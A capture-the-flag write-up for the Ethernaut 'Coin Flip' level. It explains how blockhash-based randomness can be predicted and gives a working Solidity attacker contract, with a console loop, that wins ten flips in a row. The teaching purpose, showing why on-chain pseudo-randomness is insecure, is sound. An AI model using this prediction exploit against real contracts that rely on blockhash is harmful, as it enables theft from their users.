# Coin Flip

## Objective

Predict the outcome of a coin flip 10 times in a row by exploiting a vulnerability in the contract’s pseudo-randomness. The goal is to achieve 10 consecutive wins and submit the instance to complete the level.

---

## Getting Started

1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Coin Flip"** level
3. Click **“Get new instance”** and approve the transaction in MetaMask
4. The instance is now deployed and available as the `contract` object in the browser console
5. Save the instance address:

  ```js
  contract.address
  ```

---

## Walkthrough

### Step 1: Analyze the Coin Flip Logic

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1;
```

**Explanation:**
The contract determines the coin flip outcome using the previous block’s hash and a known constant (`FACTOR`). Both values are accessible, allowing you to replicate the logic off-chain or in your own contract to predict the result.

---

### Step 2: Build an Attack Contract

```solidity
pragma solidity ^0.8.0;
interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
  function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
  ICoinFlip public target;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _target) {
   target = ICoinFlip(_target);
  }

  function attack() external {
   uint256 blockValue = uint256(blockhash(block.number - 1));
   bool guess = (blockValue / FACTOR) == 1;
   target.flip(guess);
  }
}
```

**Explanation:**
This contract mimics the vulnerable logic and always submits the correct guess by using the same calculation as the target contract.

---

### Step 3: Deploy and Execute the Attack

```js
for (let i = 0; i < 10; i++) {
  await attacker.attack();
}
```

**Explanation:**
Deploy the attacker contract, then call its `attack()` function 10 times (once per block) to increment the `consecutiveWins` counter to 10.

---

## What You Learn

This level teaches the following:

* Pseudo-randomness on-chain is insecure if based on predictable values like blockhash or block number
* How to replicate contract logic to predict outcomes
* The importance of using secure randomness sources in smart contracts
* How contract-to-contract calls can share block context for deterministic attacks

---

## Resources Used

* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
* [Solidity Docs](https://docs.soliditylang.org/)
* [Ethernaut Coin Flip Writeup](https://shubhamm.me/blog/ethernaut_challenges_coin_flip)

